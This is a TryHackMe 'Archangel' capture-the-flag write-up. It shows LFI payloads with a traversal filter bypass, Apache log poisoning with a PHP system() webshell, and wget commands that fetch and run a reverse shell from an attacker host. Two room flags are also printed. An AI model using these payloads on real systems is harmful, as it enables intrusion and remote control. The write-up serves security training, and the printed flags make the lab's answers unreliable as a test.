---
title: Archangel
summary: TryHackMe boot-to-root room covering hostname discovery, local file inclusion, log poisoning, callback shell access, and Linux privilege escalation.
date: 2026-04-07
tags: [TryHackMe, Boot2Root, Web, LFI, Log Poisoning, Callback Shell, Privilege Escalation]
difficulty: easy
os: Linux
url: https://tryhackme.com/room/archangel
---

# CTF Room: Archangel
- [Link to room](https://tryhackme.com/room/archangel)
- **Difficulty:** Easy
- **Category:** Boot2Root, Web, LFI, PrivEsc
- **OS:** Linux

## 1. Deploy Machine
A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.

## 2. Get A Shell

#### Find a different hostname
### NMAP Scan
```bash
nmap -sV -sC -p- archangel.thm
```
```text
Starting Nmap 7.98 at 2026-04-07 11:31 +0100
Nmap scan report for 10.81.160.105
Host is up.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux
```

Browsing to port 80 and inspecting the homepage revealed the domain `mafialive.thm`.

### Modify `/etc/hosts`
```bash
sudo nano /etc/hosts
```
```text
<target-ip>    mafialive.thm
```

Navigating to the virtual host revealed the first flag.

### Flag 1
```text
||thm{f0und_th3_r1ght_h0st_n4m3}||
```

#### Look for a page under development
### Robots.txt
```text
User-agent: *
Disallow: /test.php
```

The `test.php` path looked like a development page and became the next target.

## 3. Local File Inclusion

The development page used a `view` parameter to include server-side files. Standard traversal was blocked, but the page still allowed reads from the expected development directory.

### LFI Payload 1
```http
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php HTTP/1.1
Host: mafialive.thm
```

This showed that `mrrobot.php` only printed `control is an illusion`.

### LFI Payload 2
```http
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php HTTP/1.1
Host: mafialive.thm
```

Decoding the response exposed the page logic and the second flag.

### Flag 2
```text
||thm{explo1t1ng_lf1}||
```

The decoded source showed the relevant filter logic:

```php
<?php
// FLAG: ||thm{explo1t1ng_lf1}||

function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}

if (isset($_GET["view"])) {
    if (!containsStr($_GET["view"], "../..") && containsStr($_GET["view"], "/var/www/html/development_testing")) {
        include $_GET["view"];
    } else {
        echo "Sorry, Thats not allowed";
    }
}
?>
```

The source showed that the filter checked for `../..` and required the path to contain the development directory. The bypass was to use an alternate traversal pattern such as `..//..`, which still resolved correctly.

## 4. Command Execution

Apache access-log poisoning was used to turn the file include into command execution. Apache records request headers in its access log, so I sent a PHP command-execution snippet in the `User-Agent` header and then included the log file through the LFI.

```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://mafialive.thm/
```

With the PHP snippet written into the log, I included the Apache access log and passed a test command through the `cmd` parameter.

```http
http://mafialive.thm/test.php?view=%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2F%2F..%2F%2F..%2F%2F..%2F%2Flog%2Fapache2%2Faccess.log&cmd=uname
```

> **Warning:** Only run payloads like this in a lab or on a system you are explicitly authorised to test.

After confirming command execution, I used the Pentestmonkey PHP reverse shell as the callback payload.

```text
https://github.com/pentestmonkey/php-reverse-shell
```

On my attacking machine, I served the edited reverse shell and started a listener.

```bash
python3 -m http.server 1337
nc -lvnp 1337
```

Then I used the poisoned log to download and execute the shell on the target.

```http
http://mafialive.thm/test.php?view=%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2F..%2F.%2F..%2F.%2F..%2Flog%2Fapache2%2Faccess.log&cmd=wget%20http://<your-ip>:1337/shell.php%20-O%20/tmp/shell.php
```

```http
http://mafialive.thm/test.php?view=%2Fvar%2Fwww%2Fhtml%2Fdevelopment_testing%2F..%2F.%2F..%2F.%2F..%2Flog%2Fapache2%2Faccess.log&cmd=php%20/tmp/shell.php
```

After the callback connected, I stabilised the shell and continued enumeration from the low-privileged web user.

## 5. Summary
Archangel links together virtual-host discovery, LFI source disclosure, filter bypasses, log poisoning, and Linux privilege escalation.
